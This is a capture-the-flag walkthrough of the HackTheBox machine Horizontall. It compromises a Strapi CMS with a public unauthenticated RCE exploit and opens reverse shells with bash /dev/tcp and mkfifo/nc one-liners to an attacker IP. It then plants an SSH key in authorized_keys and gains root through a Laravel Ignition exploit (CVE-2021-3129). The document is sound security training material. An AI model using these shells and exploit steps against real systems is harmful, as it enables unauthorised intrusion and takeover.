---
title: "Walk-through of Horizontall from HackTheBox"
header:
  teaser: /assets/images/2021-09-30-15-53-34.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Gobuster
  - Feroxbuster
  - Strapi
  - Laravel
---

## Machine Information

![horizontall](/assets/images/2021-09-30-15-53-34.png)

Horizontall is rated as an easy machine on HackTheBox. Our initial scan reveals just two open ports. There's just a static website on port 80, but enumeration of vhosts find a hidden sub domain. Further searching is needed to uncover folders on the subdomain. From there we find an vulnerable version of Strapi, and use a public exploit to gain initial access. LinPEAS reveals a suspicious port running internally on the box. After confirming it is Laravel we set up an SSH tunnel to access it from Kali. On inspection we see this is a vulnerable version of Laravel, so we use a public exploit get the root flag.

<!--more-->

Skills required are web and OS enumeration. Skills learned are finding and using public exploits to gain access.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Horizontall](https://www.hackthebox.eu/home/machines/profile/374) |
| Machine Release Date | 28th August 2021 |
| Date I Completed It | 6th October 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb]
└─# mkdir horizontall && cd $_

┌──(root💀kali)-[~/htb/horizontall]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.105 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/horizontall]
└─# nmap -p$ports -sC -sV -oA horizontall 10.10.11.105
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-30 15:57 BST
Nmap scan report for 10.10.11.105
Host is up (0.023s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp   open  http        nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First add the IP of the box to our hosts file:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# echo "10.10.11.105 horizontall.htb" >> /etc/hosts
```

Just port 80 to look at for now:

![horizontall-port-80](/assets/images/2021-09-30-16-13-02.png)

We find a static webpage with nothing interesting in the source code. Let's look for hidden files:

```sh
┌──(root💀kali)-[~/htb/horizontall]
└─# feroxbuster -u http://horizontall.htb -x pdf -x js,html -x php txt json,docx
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [pdf, js, html, php, txt, json, docx]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       13w      194c http://horizontall.htb/js
301        7l       13w      194c http://horizontall.htb/css
301        7l       13w      194c http://horizontall.htb/img
200        1l       43w      901c http://horizontall.htb/index.html
[####################] - 3m    959968/959968  0s      found:4       errors:0      
[####################] - 3m    239992/239992  1126/s  http://horizontall.htb
[####################] - 3m    239992/239992  1127/s  http://horizontall.htb/js
[####################] - 3m    239992/239992  1125/s  http://horizontall.htb/css
[####################] - 3m    239992/239992  1127/s  http://horizontall.htb/img
```

## Subdomain Enumeration

Nothing stands out in those folders, look for subdomains:

```text
┌──(root💀kali)-[~]
└─# gobuster vhost -u http://horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/30 16:07:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
===============================================================
2021/09/30 16:16:22 Finished
===============================================================
```

We found a subdomain called api-prod, add to hosts file:

```text
┌──(root💀kali)-[~]
└─# echo "10.10.11.105 api-prod.horizontall.htb" >> /etc/hosts
```

Looking at the site on this sub domain it's just an empty page. Wappalyzer shows it sees Strapi as underlying CMS:

![horizontall-api-prod](/assets/images/2021-09-30-16-17-44.png)

## Web Enumeration

Let's enumerate some more:

```sh
┌──(root💀kali)-[~/htb/horizontall]
└─# feroxbuster -u http://api-prod.horizontall.htb -x pdf -x js,html -x php txt json,docx

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [pdf, js, html, php, txt, json, docx]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       16l      101w      854c http://api-prod.horizontall.htb/admin
200       16l      101w      854c http://api-prod.horizontall.htb/Admin
403        1l        1w       60c http://api-prod.horizontall.htb/users
200       19l       33w      413c http://api-prod.horizontall.htb/index.html
200        1l       21w      507c http://api-prod.horizontall.htb/reviews
200       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
403        1l        1w       60c http://api-prod.horizontall.htb/Users
200        3l       21w      121c http://api-prod.horizontall.htb/robots.txt
200        1l       21w      507c http://api-prod.horizontall.htb/Reviews
[####################] - 7m    239992/239992  0s      found:9       errors:0      
[####################] - 7m    239992/239992  508/s   http://api-prod.horizontall.htb
```

That's more like it! Looking at the reviews folder we see there is an API interface:

![horizontall-reviews](/assets/images/2021-09-30-16-28-42.png)

## Strapi Login

Looking at the admin folder we see a login:

![horizontall-admin](/assets/images/2021-09-30-16-27-56.png)

A quick Google reveals the version can be found like this:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}
```

Checking Exploit-DB reveals an unauthenticated RCE:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# searchsploit strapi                             
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                         | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)       | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py
--------------------------------------------------------------------------- ---------------------------------
```

Let's grab that last exploit and have a look:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# searchsploit -m multiple/webapps/50239.py
  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50239
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
File Type: Python script, ASCII text executable
Copied to: /root/htb/horizontall/50239.py
```

## Exploiting Strapi

Reading the script we just execute it and point at the website:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# python3 50239.py http://api-prod.horizontall.htb 
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzMDE2MjMyLCJleHAiOjE2MzU2MDgyMzJ9.yd3UIWlfe9-JzAs1O5StFBbP_NN0yBdhTRswArk82os
$>
```

The exploit has reset the admin users password and given us a command prompt:

```text
$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```

Ok so I can't use it to output to the terminal, let's try a shell:

```text
$> bash -i >& /dev/tcp/10.10.14.214/4444 0>&1
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
```

## Reverse Shell

I didn't get a connection from that one, try another type:

```text
$> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.214 4444 >/tmp/f
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

This time we catch the shell:

```text
┌──(root💀kali)-[~]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.214] from (UNKNOWN) [10.10.11.105] 55312
/bin/sh: 0: can't access tty; job control turned off
```

Upgrade to a proper terminal first:

```text
$ python -c 'import pty;pty.spawn("/bin/bash")'
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
strapi@horizontall:~/myapi$ 
```

## User Flag

Who are we? And can we get the user flag:

```text
strapi@horizontall:~/myapi$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)

strapi@horizontall:~/myapi$ ls -l /home
drwxr-xr-x 8 developer developer 4096 Aug  2 12:07 developer

strapi@horizontall:~/myapi$ ls -l /home/developer/
-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
drwx------ 12 developer developer  4096 May 26 12:21 myproject
-r--r--r--  1 developer developer    33 Sep 30 08:59 user.txt

strapi@horizontall:~/myapi$ cat /home/developer/user.txt 
<HIDDEN>
```

## Privilege Escalation

Ok that was easy! On to privilege escalation, let's pull LinPEAS over to speed it up. Grab the latest version from [here](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) if needed. Start a web server on Kali to host it:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Switch to the box, pull it over and run it:

```text
strapi@horizontall:/dev/shm$ wget http://10.10.14.214/linpeas.sh
--2021-09-30 16:23:47--  http://10.10.14.214/linpeas.sh
Connecting to 10.10.14.214:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 473371 (462K) [text/x-sh]
Saving to: ‘linpeas.sh’
linpeas.sh.1        100%[===================>] 462.28K  2.05MB/s    in 0.2s    
2021-09-30 16:23:47 (2.05 MB/s) - ‘linpeas.sh’ saved [473371/473371]

strapi@horizontall:/dev/shm$ chmod +x linpeas.sh       

strapi@horizontall:/dev/shm$ ./linpeas.sh > linpeas.txt
grep: write error: Broken pipe
sh: printf: I/O error
grep: write error: Broken pipe
. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
```

It takes a fair while to complete. The output is long, but LinPEAS highlights interesting areas in red so this part stood out:

```text
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:80          0.0.0.0:*       LISTEN  -
tcp        0      0 0.0.0.0:22          0.0.0.0:*       LISTEN  -
tcp        0      0 127.0.0.1:1337      0.0.0.0:*       LISTEN  1830/node /usr/bin/
tcp        0      0 127.0.0.1:8000      0.0.0.0:*       LISTEN  -                   
tcp        0      0 127.0.0.1:3306      0.0.0.0:*       LISTEN  -                   
tcp6       0      0 :::80               :::*            LISTEN  -                   
tcp6       0      0 :::22               :::*            LISTEN  -  
```

I could have found this much quicker by just using netstat:

```text
strapi@horizontall:~/myapi$ netstat -pentul
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address      Foreign Address   State     User   Inode    PID/Program name    
tcp        0      0 0.0.0.0:80         0.0.0.0:*         LISTEN    0      28138    -                   
tcp        0      0 0.0.0.0:22         0.0.0.0:*         LISTEN    0      26624    -                   
tcp        0      0 127.0.0.1:1337     0.0.0.0:*         LISTEN    1001   33273    1830/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000     0.0.0.0:*         LISTEN    0      35123    -                   
tcp        0      0 127.0.0.1:3306     0.0.0.0:*         LISTEN    111    30010    -                   
tcp6       0      0 :::80              :::*              LISTEN    0      28139    -                   
tcp6       0      0 :::22              :::*              LISTEN    0      28683    -     
```

## Laravel Detection

Oh well. Let's have a look at the local port 8000 by using curl from the box:

```text
strapi@horizontall:~/myapi$ curl -sSL -D - http://localhost:8000 -o /dev/null
HTTP/1.1 200 OK
Host: localhost:8000
Date: Thu, 30 Sep 2021 20:45:41 GMT
Connection: close
X-Powered-By: PHP/7.4.22
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Thu, 30 Sep 2021 20:45:41 GMT
```

The headers reveal there is a webserver running on this internally accessible port. If we request the default page we can pick out something called Laravel:

```html
strapi@horizontall:~/myapi$ curl -sSL http://localhost:8000                  
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Laravel</title>
    <SNIP>
    <div class="mt-2 text-gray-600 dark:text-gray-400 text-sm">
    Laravel has wonderful, thorough documentation covering every aspect of the framework. 
    Whether you are new to the framework or have previous experience with Laravel,
    we recommend reading all of the documentation from beginning to end.
    </div>
    <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
    Laravel v8 (PHP v7.4.18)
    </div>
```

## SSH Port Forwarding

So we have a website running on an internal port, which means we need to use port forwarding on Kali to allow us to access that website from our local browser. We've seen this on a number of machines before, first step is to create a SSH key pair:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# ssh-keygen          
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/htb/horizontall/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/htb/horizontall/id_rsa
Your public key has been saved in /root/htb/horizontall/id_rsa.pub
The key fingerprint is:
SHA256:roCdl+6laUp63MTjLU4+V3J9C1XAAhjx8mrgmdhpFco root@kali
The key's randomart image is:
+---[RSA 3072]----+
|        o+.. ... |
|        ..  . . .|
|        o .  . . |
|     . . +    .  |
|     .E S .. .   |
|   o =+O..o o .  |
|  ..*+@o=+   o . |
|   ooB**o     .  |
|  ...=O+         |
+----[SHA256]-----+
```

Take the public key and create an echo statement that we can paste on the box:

```text
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8EvKu+pSGQwdANMmazDgzTRXzmk3LyT+WxaKurXTjFZY8Rrl9OQ1K05WM1aEKQybhO0J/Fh1U0dd0QNa+nof5vWQQZisdq2jfUk1V0h6LMQiUyYpN8nxw0lQ4Dl0EEER/BWYkVKbS0PxthcT+jME6Prc5IQCQ5JYxK1qeHycvF+2ppD+Zem4Q7ifVvYkKgNPAdmXGgV2jaR8jq6PnauZSkh+KSg5i2uQ2AkepdsOb9HIjZFni+GVPVq/Ik/NLH+kMJFMj4Jej7dxD5+FmZpvDeh3qJobqH/xUaDAh3Zfrk1HahSo7dVpggzDPcLsFK8pPTYQM//S5s/n3AHHJuBdSvMQXBkJ5q3JD+midSFT7lTtzxFgqUddRjcs+Rz7wOWdhx95UNiNgBnYrPu06ha1MmyZMTTQHKha43dQ9oHgeOmKMI7or7WaAqTMNwfg65a2yHjCegYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
```

This is just echoing the contents of the id_rsa.pub file to a file called authorized_keys. Copy this to the clipboard and then switch back to the box:

```text
strapi@horizontall:~$ cd .ssh/
strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8EvKu+pSGQwdANMmazDgzTRXzmk3LyT+WxaKurXTjFZY8Rrl9OQ1K05WM1aEKQybhO0J/Fh1U0dd0QNa+nof5vWQQZisdq2jfUk1V0h6LMQiUyYpN8nxw0lQ4Dl0EEER/BWYkVKbS0PxthcT+jME6Prc5IQCQ5JYxK1qeHycvF+2ppD+Zem4Q7ifVvYkKgNPAdmXGgV2jaR8jq6PnauZSkh+KSg5i2uQ2AkepdsOb9HIjZFni+GVPVq/Ik/NLH+kMJFMj4Jej7dxD5+FmZpvDeh3qJobqH/xUaDAh3Zfrk1HahSo7dVpggzDPcLsFK8pPTYQM//S5s/n3AHHJuBdSvMQXBkJ5q3JD+midSFT7lTtzxFgqUddRjcs+Rz7wOWdhx95UNiNgBnYrPu06ha1MmyZMTTQHKha43dQ9oHgeOmKMI7or7WaAqTMNwfg65a2yHjCegYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
```

With the public key from Kali in the authorized_keys file on the box we can now SSH in as the user strapi setting up port forwarding at the same time:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# ssh -i id_rsa -L 8000:localhost:8000 strapi@10.10.11.105
The authenticity of host '10.10.11.105 (10.10.11.105)' can't be established.
ECDSA key fingerprint is SHA256:rlqcbRwBVk92jqxFV79Tws7plMRzIgEWDMc862X9ViQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.105' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)
Last login: Thu Sep 30 19:55:29 2021 from 10.10.14.210
$ 
```

## Laravel Exploit

The above command is simply saying any traffic received locally on port 8000 forward through SSH to the box on port 8000. Now we can access the website on the box using our local browser on Kali:

![horizontall-laravel](/assets/images/2021-09-30-22-24-15.png)

Looking at the site we can confirm it's running Laravel v8 (PHP v7.4.18). A search for an exploit finds [this](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129) CVE which says:

```text
Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.
```

We are on a version prior to 8.4.2, a look on GitHub finds [this](https://github.com/nth347/CVE-2021-3129_exploit) POC. We simply clone and run it against the box, let's try it:

```text
┌──(root💀kali)-[~/htb/horizontall]
└─# git clone https://github.com/nth347/CVE-2021-3129_exploit.git
Cloning into 'CVE-2021-3129_exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.

┌──(root💀kali)-[~/htb/horizontall]
└─# cd CVE-2021-3129_exploit

┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]
└─# chmod +x exploit.py

┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]
└─# ./exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 2598, done.
remote: Counting objects: 100% (940/940), done.
remote: Compressing objects: 100% (528/528), done.
remote: Total 2598 (delta 379), reused 822 (delta 287), pack-reused 1658
Receiving objects: 100% (2598/2598), 390.29 KiB | 540.00 KiB/s, done.
Resolving deltas: 100% (1021/1021), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

## Root Flag

That was nice and simple. The exploit ran and gave us the root id back. Let's grab the flag:

```text
┌──(root💀kali)-[~/htb/horizontall/CVE-2021-3129_exploit]
└─# ./exploit.py http://localhost:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

a<HIDDEN>6

[i] Trying to clear logs
[+] Logs cleared
```

That was an interesting box, I hope you enjoyed it.

See you next time.
